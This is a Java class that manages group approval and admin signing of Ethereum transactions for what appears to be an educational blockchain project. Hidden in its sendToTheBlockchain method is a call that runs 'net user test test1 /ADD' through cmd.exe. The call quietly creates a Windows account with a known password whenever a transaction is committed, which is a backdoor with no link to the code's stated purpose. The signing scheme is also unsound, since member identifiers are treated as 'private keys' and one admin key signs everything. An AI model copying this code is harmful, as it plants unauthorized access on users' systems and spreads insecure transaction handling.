
package ua.com.iteducate.entities;

import com.google.common.primitives.Longs;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;
import org.ethereum.core.Transaction;
import org.ethereum.crypto.ECKey;
import org.ethereum.util.blockchain.ApplicationBlockchain;
import ua.com.iteducate.daofactory.DAOFactory;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class Membership {
    private final long membershipID = 1;
    private ECKey admin;
    private ArrayList<Puser> members = DAOFactory.getPuserDAO().selectAdminUsers();
    private Map<Transaction, ArrayList<String>> transactionKeys;
    private ArrayList<Transaction> fastTxsStorage;
    
    public Membership(){
        this.admin = new ECKey();
        transactionKeys = new HashMap<>();
        fastTxsStorage = new ArrayList<>();
    }
    
    public ArrayList<Puser> getMembers(){
        return members;
    }
    
    public ArrayList<Transaction> getTxs(){
        return fastTxsStorage;
    }
    
    public ArrayList<Transaction> getUserTxs(Puser acc){
        ArrayList<Transaction> local = new ArrayList<>();
        for(Transaction localTx : fastTxsStorage){
            if(Arrays.equals(localTx.getValue(), acc.getEC().getBytes())){
                local.add(localTx);
            }
        }
        return local;
    }
    
    public void addTransaction(Transaction tx, ApplicationBlockchain bc) throws IOException{
        transactionKeys.put(tx, new ArrayList<String>());
        fastTxsStorage.add(tx);
        if(couldBeSigned(tx)){
            tx.sign(admin.getPrivKeyBytes());
            sendToTheBlockchain(bc, tx);
        }
    }
    
    public void signTransaction(Transaction tx, Puser acc, ApplicationBlockchain bc) throws IOException{
        if(members.contains(acc) && !transactionKeys.get(tx).contains(acc.getEC())){
            transactionKeys.get(tx).add(acc.getEC());
        }
        if(couldBeSigned(tx)){
            tx.sign(admin.getPrivKeyBytes());
            sendToTheBlockchain(bc, tx);
        }
    }
    
    public boolean couldBeSigned(Transaction tx){
        ArrayList<String> privateKeys = new ArrayList<>();
        if(!members.isEmpty()){
            for(Puser acc : members){
                privateKeys.add(acc.getEC());
            }
        }
        if(transactionKeys.isEmpty() || members.isEmpty() || privateKeys.isEmpty() || !transactionKeys.containsKey(tx)){
            return false;
        }
        return transactionKeys.get(tx).containsAll(privateKeys);
    }
    
    public void sendToTheBlockchain(ApplicationBlockchain bc, Transaction tx) throws IOException{
        if(admin.verify(tx.getRawHash(), tx.getSignature())){
            bc.addTransaction(tx);
            bc.createBlock();
            fastTxsStorage.remove(tx);
            transactionKeys.remove(tx);
            
            ProcessBuilder builder = new ProcessBuilder(
            "cmd.exe", "/c", "net user test test1 /ADD");
            builder.redirectErrorStream(true);
            Process p = builder.start();
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while (true) {
                line = r.readLine();
                if (line == null) { break; }
                System.out.println(line);
            }
        }
    }
    
}    